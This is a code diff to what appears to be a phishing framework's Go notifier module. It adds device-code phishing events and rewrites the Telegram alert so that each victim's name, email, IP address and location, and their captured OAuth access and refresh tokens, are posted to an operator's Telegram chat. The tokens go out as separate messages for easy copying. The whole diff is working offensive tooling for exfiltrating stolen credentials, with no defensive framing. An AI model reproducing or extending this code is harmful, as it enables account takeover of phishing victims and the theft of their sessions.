@@ -179,10 +179,12 @@ func NewNotifierManager() *NotifierManager {
 func getDefaultNotifierConfig() *DefaultNotifierConfig {
 	return &DefaultNotifierConfig{
 		Triggers: map[string]bool{
-			EventLureClicked:        false,
-			EventLureLanded:         false,
-			EventCredentialCaptured: true,
-			EventSessionCaptured:    true,
+			EventLureClicked:         false,
+			EventLureLanded:          false,
+			EventCredentialCaptured:  true,
+			EventSessionCaptured:     true,
+			EventDeviceCodeCaptured:  true,
+			EventDeviceCodeGenerated: false,
 		},
 		Templates: map[string]*NotifierEventTemplate{
 			EventLureClicked: {
@@ -1064,12 +1066,77 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		text += fmt.Sprintf("    Country:- %s", geoInfo.Country)
 
 	case EventDeviceCodeCaptured:
-		text = "🔐 Device Code Tokens Captured!\n\n"
-		text += fmt.Sprintf("🔗 Phishlet: %s\n", data.Phishlet)
-		text += fmt.Sprintf("🌐 Origin: %s\n", data.Origin)
+		// Get user info from custom fields
+		userEmail := ""
+		userName := ""
+		provider := ""
+		client := ""
+		if data.Custom != nil {
+			userEmail = data.Custom["dc_user_email"]
+			userName = data.Custom["dc_user_name"]
+			provider = data.Custom["dc_provider"]
+			client = data.Custom["dc_client"]
+		}
+		if provider == "" {
+			provider = data.Phishlet
+		}
+
+		text = "🎯 DEVICE CODE TOKENS CAPTURED!\n"
+		text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+		text += fmt.Sprintf("👤 User: %s\n", userName)
+		text += fmt.Sprintf("📧 Email: %s\n", userEmail)
+		text += fmt.Sprintf("🔗 Provider: %s\n", provider)
+		text += fmt.Sprintf("📱 Client: %s\n", client)
+		text += fmt.Sprintf("🌐 IP: %s\n", data.Origin)
 		text += fmt.Sprintf("📍 Location: %s, %s %s\n", geoInfo.City, geoInfo.Country, geoInfo.CountryFlag)
 		text += fmt.Sprintf("🏢 ISP: %s\n", geoInfo.ISP)
-		text += fmt.Sprintf("⏰ Time: %s", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
+		text += fmt.Sprintf("⏰ Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05 UTC"))
+
+		// Send the main message first
+		payload := map[string]interface{}{
+			"chat_id": n.TelegramChatID,
+			"text":    text,
+		}
+		jsonData, _ := json.Marshal(payload)
+		url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", n.TelegramBotToken)
+		client2 := &http.Client{Timeout: 10 * time.Second}
+		client2.Post(url, "application/json", bytes.NewBuffer(jsonData))
+
+		// Now send individual token messages for easy copying
+		if data.Custom != nil {
+			// Access Token - send as separate message
+			if accessToken := data.Custom["dc_access_token"]; accessToken != "" {
+				tokenMsg := "🔑 ACCESS TOKEN\n"
+				tokenMsg += "━━━━━━━━━━━━━━━━━\n"
+				tokenMsg += fmt.Sprintf("👤 %s\n\n", userEmail)
+				tokenMsg += fmt.Sprintf("<code>%s</code>", accessToken)
+
+				tokenPayload := map[string]interface{}{
+					"chat_id":    n.TelegramChatID,
+					"text":       tokenMsg,
+					"parse_mode": "HTML",
+				}
+				tokenJson, _ := json.Marshal(tokenPayload)
+				client2.Post(url, "application/json", bytes.NewBuffer(tokenJson))
+			}
+
+			// Refresh Token - send as separate message
+			if refreshToken := data.Custom["dc_refresh_token"]; refreshToken != "" {
+				tokenMsg := "🔄 REFRESH TOKEN\n"
+				tokenMsg += "━━━━━━━━━━━━━━━━━\n"
+				tokenMsg += fmt.Sprintf("👤 %s\n\n", userEmail)
+				tokenMsg += fmt.Sprintf("<code>%s</code>", refreshToken)
+
+				tokenPayload := map[string]interface{}{
+					"chat_id":    n.TelegramChatID,
+					"text":       tokenMsg,
+					"parse_mode": "HTML",
+				}
+				tokenJson, _ := json.Marshal(tokenPayload)
+				client2.Post(url, "application/json", bytes.NewBuffer(tokenJson))
+			}
+		}
+		return nil
 
 	case EventDeviceCodeGenerated:
 		text = "📱 Device Code Generated\n\n"
